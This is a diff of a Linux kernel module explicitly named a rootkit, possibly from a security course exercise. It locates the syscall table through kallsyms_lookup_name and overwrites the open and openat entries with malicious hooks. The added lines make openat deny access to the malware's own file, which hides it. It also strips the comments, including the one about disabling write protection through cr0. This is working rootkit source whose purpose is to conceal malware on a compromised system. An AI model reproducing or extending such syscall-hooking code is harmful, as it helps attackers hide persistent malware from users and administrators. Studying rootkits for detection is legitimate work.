@@ -21,6 +21,10 @@ asmlinkage long (*original_sys_open)(const char __user *filename, int flags, umo
 
 asmlinkage long mal_sys_openat(int dfd, const char __user *filename, int flags, umode_t mode)
 {
+		if (!strcmp(filename, malware_name)) {
+				return EACCES;
+		}
+
 		return original_sys_openat(dfd, filename, flags, mode);
 }
 
@@ -43,20 +47,16 @@ static void patch_syscall(uint64_t index, uint64_t function_ptr)
 
 static int __init rootkit_init(void)
 {
-		// Here, install initialization procedures
 		printk(KERN_INFO "Initializing...\n");
 
 		malware_name = MALWARE_NAME;
 
-		// TODO: hook syscall table, reset some function pointers
 		syscall_table = (uint64_t *)kallsyms_lookup_name("sys_call_table");
 		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", syscall_table);
 
 		original_sys_open = (long (*)(const char *, int, umode_t))syscall_table[__NR_open];
 		original_sys_openat = (long (*)(int, const char *, int, umode_t))syscall_table[__NR_openat];
 
-		// in order to write to syscall table, must fix cr0 to allow write
-		// access first!
 		patch_syscall(__NR_open, (uint64_t)mal_sys_open);
 		patch_syscall(__NR_openat, (uint64_t)mal_sys_openat);
 
